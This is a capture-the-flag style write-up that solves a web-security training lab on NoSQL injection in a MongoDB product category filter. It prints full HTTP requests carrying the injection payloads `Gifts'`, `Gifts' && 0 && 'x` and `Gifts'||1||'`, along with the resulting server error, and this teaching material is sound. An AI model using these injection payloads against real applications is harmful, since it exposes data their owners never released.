## Detecting NoSQL injection

The product category filter for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection.

To solve the lab, perform a NoSQL injection attack that causes the application to display unreleased products.


## Notes

- /filter?category= 

## Resume

1. Get on the category page and submit a fuzz string to get an error `Gifts'+'`
2. Send a condition that always return true or false : `Gifts' && 1 && 'x` (url encoded)
3. Send a boolean condition that always evaluates to true in the category parameter `?category=Gifts'||1||'`

## Solve 

Find the endpoint vulnerable to NoSQL injection by sending a fyzz string to triger a mongo db error : 

```
GET /filter?category=Gifts' HTTP/2
Host: 0a4500bc048bdc6a81e448f6009b0097.web-security-academy.net
Cookie: session=WK4XsSl1qZf00LdA5kgVGRR7vGcxOVbm
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: fr-FR,fr;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

The error : 

```
Internal Server Error
Command failed with error 139 (JSInterpreterFailure): 'SyntaxError: unterminated string literal : functionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25 ' on server 127.0.0.1:27017. The full response is {"ok": 0.0, "errmsg": "SyntaxError: unterminated string literal :\nfunctionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25\n", "code": 139, "codeName": "JSInterpreterFailure"}
```

This confirm that the db running is mongo db and could be vulnerable to NoSQL injection.

Send a condition that always return true or false to see if we can modify the answer from the application : 

```
GET /filter?category=Gifts'+%26%26+0+%26%26+'x HTTP/2
Host: 0a4500bc048bdc6a81e448f6009b0097.web-security-academy.net
Cookie: session=WK4XsSl1qZf00LdA5kgVGRR7vGcxOVbm
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: fr-FR,fr;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

With this request and the answer we can see that there is no product display from the application, so our false condition works and confirm that the application is vulnerable to NoSQL injection.

Send boolean condition that always evaulates to true in the category parameter : 

```
GET /filter?category=Gifts'||1||' HTTP/2
Host: 0a4500bc048bdc6a81e448f6009b0097.web-security-academy.net
Cookie: session=WK4XsSl1qZf00LdA5kgVGRR7vGcxOVbm
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: fr-FR,fr;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

This causes the application to display unreleased products.